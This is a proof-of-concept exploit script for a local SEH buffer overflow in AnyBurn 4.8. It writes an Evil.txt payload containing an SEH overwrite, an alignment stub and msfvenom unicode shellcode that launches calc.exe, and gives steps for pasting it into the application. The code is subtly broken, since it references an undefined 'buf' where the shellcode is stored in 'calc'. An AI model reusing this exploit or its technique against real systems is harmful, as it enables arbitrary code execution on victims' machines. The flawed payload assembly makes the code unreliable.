# Exploit Title: AnyBurn
# Date: 08/03/2020		(original poc: 15-12-2018)
# Vendor Homepage: http://www.anyburn.com/
# Software Link : http://www.anyburn.com/anyburn_setup.exe
# Exploit Author: Crawl3r 	(original poc: Achilles)
# 	Tested and Debugged with rd_pentest (cheers Rich!)
# Tested Version: 4.8     	(original poc: 4.3 (32-bit))
# Tested on: Windows 10 x64			(original poc: Windows 7 x64)
# Vulnerability Type: Local SEH Buffer Overflow	(original poc: Denial of Service (DoS) Local Buffer Overflow)


# Steps to Produce the Crash:
# 1.- Run python code : AnyBurn.py
# 2.- Open EVIL.txt and copy content to clipboard
# 3.- Open AnyBurn choose 'Copy disk to Image'
# 4.- Paste the content of EVIL.txt into the field: 'Image file name'
# 5.- Click 'Create Now' and you will see a crash.


#!/usr/bin/env python
eax_align = "\x47"		# venetian pad/align
eax_align += "\x56" 		# push esi
eax_align += "\x47" 		# venetian pad/align
eax_align += "\x58"		# pop eax
eax_align += "\x47" 		# venetian pad/align 
eax_align += "\x05\x1c\x11" 	# add eax,0x11001c00
eax_align += "\x47" 		# venetian pad/align
eax_align += "\x2d\x16\x11" 	# sub eax,0x11001600 (net diff +600h)
eax_align += "\x47" 		# venetian pad/align
eax_align += "\x50" 		# push eax -> eax should now point to esi + 600bytes (should be in the junk buffer)
eax_align += "\x47"		# pad to align the following ret
eax_align += "\xc3";		# ret into eax?

# note: above align only gives 600 bytes to play with. Cba doing the math to get the whole 9k but it's probably doable.

crash_buffer_size = 10000
nseh_offset = 9197
junk = "\x41" * nseh_offset 	# offset to nSeh
nSeh = "\x61\x47"    		# popad? Doesn't look like we actually need/use this, we just basically NOP through this and SEH
seh = "\x09\x48"     		# unicode friendly pop,pop,ret -> 0x00480009 (we ignore the 00's as it gets padded anyway, making our target address)

# msfvenom -a x86 -p windows/exec cmd=calc.exe -e x86/unicode_upper BufferRegister=EAX EXITFUNC=thread -f py
# 512 Bytes
calc =  ""
calc += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x51"
calc += "\x41\x54\x41\x58\x41\x5a\x41\x50\x55\x33\x51\x41\x44"
calc += "\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41"
calc += "\x51\x41\x49\x41\x51\x41\x50\x41\x35\x41\x41\x41\x50"
calc += "\x41\x5a\x31\x41\x49\x31\x41\x49\x41\x49\x41\x4a\x31"
calc += "\x31\x41\x49\x41\x49\x41\x58\x41\x35\x38\x41\x41\x50"
calc += "\x41\x5a\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49"
calc += "\x41\x49\x51\x49\x31\x31\x31\x31\x41\x49\x41\x4a\x51"
calc += "\x49\x31\x41\x59\x41\x5a\x42\x41\x42\x41\x42\x41\x42"
calc += "\x41\x42\x33\x30\x41\x50\x42\x39\x34\x34\x4a\x42\x4b"
calc += "\x4c\x5a\x48\x53\x52\x4d\x30\x4b\x50\x4d\x30\x33\x30"
calc += "\x55\x39\x39\x55\x4e\x51\x37\x50\x32\x44\x44\x4b\x52"
calc += "\x30\x50\x30\x44\x4b\x52\x32\x4c\x4c\x54\x4b\x30\x52"
calc += "\x4c\x54\x34\x4b\x44\x32\x4f\x38\x4c\x4f\x58\x37\x30"
calc += "\x4a\x4d\x56\x4e\x51\x4b\x4f\x46\x4c\x4f\x4c\x31\x51"
calc += "\x43\x4c\x4b\x52\x4e\x4c\x4f\x30\x57\x51\x48\x4f\x4c"
calc += "\x4d\x4b\x51\x47\x57\x39\x52\x5a\x52\x50\x52\x32\x37"
calc += "\x34\x4b\x51\x42\x4e\x30\x44\x4b\x50\x4a\x4f\x4c\x34"
calc += "\x4b\x50\x4c\x4e\x31\x33\x48\x5a\x43\x51\x38\x4b\x51"
calc += "\x5a\x31\x42\x31\x54\x4b\x30\x59\x4d\x50\x4b\x51\x4a"
calc += "\x33\x34\x4b\x31\x39\x4c\x58\x4a\x43\x4f\x4a\x31\x39"
calc += "\x44\x4b\x50\x34\x34\x4b\x4b\x51\x59\x46\x4e\x51\x4b"
calc += "\x4f\x46\x4c\x49\x31\x58\x4f\x4c\x4d\x4d\x31\x57\x57"
calc += "\x50\x38\x39\x50\x34\x35\x5a\x56\x4d\x33\x53\x4d\x5a"
calc += "\x58\x4f\x4b\x53\x4d\x4f\x34\x42\x55\x49\x54\x52\x38"
calc += "\x54\x4b\x30\x58\x4f\x34\x4d\x31\x38\x53\x31\x56\x34"
calc += "\x4b\x4c\x4c\x50\x4b\x44\x4b\x30\x58\x4d\x4c\x4d\x31"
calc += "\x48\x53\x54\x4b\x4b\x54\x34\x4b\x4d\x31\x58\x50\x53"
calc += "\x59\x50\x44\x4f\x34\x4d\x54\x31\x4b\x51\x4b\x53\x31"
calc += "\x51\x49\x31\x4a\x30\x51\x4b\x4f\x59\x50\x51\x4f\x51"
calc += "\x4f\x50\x5a\x34\x4b\x4d\x42\x4a\x4b\x44\x4d\x51\x4d"
calc += "\x32\x4a\x4b\x51\x34\x4d\x53\x55\x47\x42\x4b\x50\x4d"
calc += "\x30\x4b\x50\x32\x30\x53\x38\x50\x31\x44\x4b\x52\x4f"
calc += "\x44\x47\x4b\x4f\x58\x55\x37\x4b\x49\x50\x4d\x4d\x4e"
calc += "\x4a\x4b\x5a\x31\x58\x35\x56\x45\x45\x57\x4d\x35\x4d"
calc += "\x4b\x4f\x39\x45\x4f\x4c\x4b\x56\x53\x4c\x4c\x4a\x53"
calc += "\x50\x4b\x4b\x49\x50\x43\x45\x4d\x35\x57\x4b\x50\x47"
calc += "\x4e\x33\x54\x32\x52\x4f\x32\x4a\x4d\x30\x51\x43\x4b"
calc += "\x4f\x38\x55\x31\x53\x53\x31\x52\x4c\x51\x53\x4e\x4e"
calc += "\x43\x35\x54\x38\x32\x45\x4d\x30\x41\x41"


# final payload buffer
before_calc = "\x47" * ((nseh_offset) - 918)
junk = before_calc + buf
junk_filler = nseh_offset - len(junk)
junk += "\x47" * junk_filler
print "Junk length (should be %d) : %d" % (nseh_offset, len(junk))
buffer = junk + nSeh + seh + ("\x47\x47" * 4) + eax_align

try:
 f=open("Evil.txt","w")
 print "[+] Creating %s bytes evil payload.." %len(buffer)
 f.write(buffer)
 f.close()
 print "[+] File created!"
except:
 print "File cannot be created"


''' important to note:
	When we pop pop ret to nSeh, we then actually just sort of NOP through the seh again to land in our extra cave.
	Because of unicode, the address we specify for the overwrite actually becomes to seperate instructions and therefore just steps through it without issue. Lucky this time, might not always be the case so try multiple if required.
'''
